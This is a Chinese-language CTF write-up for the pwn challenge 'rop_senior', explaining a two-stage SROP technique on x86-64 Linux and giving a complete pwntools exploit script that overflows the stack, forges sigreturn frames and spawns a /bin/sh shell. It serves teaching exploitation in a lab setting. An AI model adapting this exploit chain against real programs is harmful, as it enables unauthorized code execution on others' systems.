# rop_senior

## 题目简述

程序的可用 gadget 很少，但存在可重复触发的栈溢出、`read` 和 `syscall`。利用 Linux x86-64 的 SROP（Sigreturn-Oriented Programming），先让一次长度恰为 15 字节的 `read` 把 `rax` 置为系统调用号 `rt_sigreturn`，由伪造信号帧控制全部寄存器；第一帧把第二阶段读入 `.bss`，第二帧再执行 `execve("/bin/sh", 0, 0)`。

## 解题过程

附件中需要用到的地址如下：

```python
bss = 0x601700
vuln = 0x40062A
vuln_1 = 0x40063C
vuln_2 = 0x40063A
read = 0x40063E
syscall = 0x400647
```

在 amd64 Linux 上，`rax = 15` 时执行 `syscall` 会进入 `rt_sigreturn`。内核从当前栈读取 `rt_sigframe`，恢复其中保存的通用寄存器、`rsp` 和 `rip`，因此一个 `SigreturnFrame` 就相当于一次完整的寄存器装载。

第一帧设置 `read(0, bss, 0x400)`，并让后续栈迁移到 `.bss`：

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_read
frame.rdi = 0
frame.rsi = bss
frame.rdx = 0x400
frame.rsp = bss
frame.rip = syscall
```

初始缓冲区到返回地址的偏移为 8。先送入循环读取地址、SROP 触发地址和信号帧：

```python
stage1 = b"A" * 8 + p64(vuln) + p64(vuln_1) + bytes(frame)
io.sendafter(b"best", stage1)
```

再次进入 `read` 后必须严格发送 15 字节，使返回值 `rax` 正好等于 15。`p64(vuln_1)[:7]` 连同前 8 字节填充一共 15 字节；目标地址的最高字节原本就是 0，缓冲区中的终止零字节补全它：

```python
trigger = b"A" * 8 + p64(vuln_1)[:7]
assert len(trigger) == 15
io.sendafter(b"best", trigger)
```

`rt_sigreturn` 恢复第一帧后执行 `read`，把下一阶段写到 `.bss`。第二个信号帧设置 `execve`：

```python
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bss + 0x120
frame.rsi = 0
frame.rdx = 0
frame.rsp = bss
frame.rip = syscall

stage2 = b"A" * 8 + p64(vuln) + p64(vuln_1) + bytes(frame)
stage2 = stage2.ljust(0x120, b"B") + b"/bin/sh\x00"
io.send(stage2)

io.sendafter(b"best", trigger)
io.interactive()
```

完整脚本如下：

```python
from pwn import *


context.arch = "amd64"
context.log_level = "debug"
io = process("./rop_senior")

bss = 0x601700
vuln = 0x40062A
vuln_1 = 0x40063C
syscall = 0x400647

read_frame = SigreturnFrame()
read_frame.rax = constants.SYS_read
read_frame.rdi = 0
read_frame.rsi = bss
read_frame.rdx = 0x400
read_frame.rsp = bss
read_frame.rip = syscall

io.sendafter(
    b"best",
    b"A" * 8 + p64(vuln) + p64(vuln_1) + bytes(read_frame),
)

trigger = b"A" * 8 + p64(vuln_1)[:7]
assert len(trigger) == constants.SYS_rt_sigreturn
io.sendafter(b"best", trigger)

exec_frame = SigreturnFrame()
exec_frame.rax = constants.SYS_execve
exec_frame.rdi = bss + 0x120
exec_frame.rsi = 0
exec_frame.rdx = 0
exec_frame.rsp = bss
exec_frame.rip = syscall

stage2 = b"A" * 8 + p64(vuln) + p64(vuln_1) + bytes(exec_frame)
io.send(stage2.ljust(0x120, b"B") + b"/bin/sh\x00")
io.sendafter(b"best", trigger)
io.interactive()
```

官方 PDF 使用 `str(sigframe)`，这是旧版 Python/pwntools 的写法；在 Python 3 中应显式使用 `bytes(frame)`，否则会把对象的文本表示混入 payload。PDF 未保留动态 flag。

## 方法总结

SROP 适合 gadget 极少、但能重复读入并执行 `syscall` 的二进制。这里最容易出错的不是信号帧字段，而是触发 `rt_sigreturn` 所需的精确读取长度：少一字节或多一字节都会让 `rax != 15`。第一帧解决“把大载荷放到可写区”，第二帧解决“设置 `execve` 全部参数”，两阶段之间再用同一 15 字节触发串进入第二次 sigreturn。
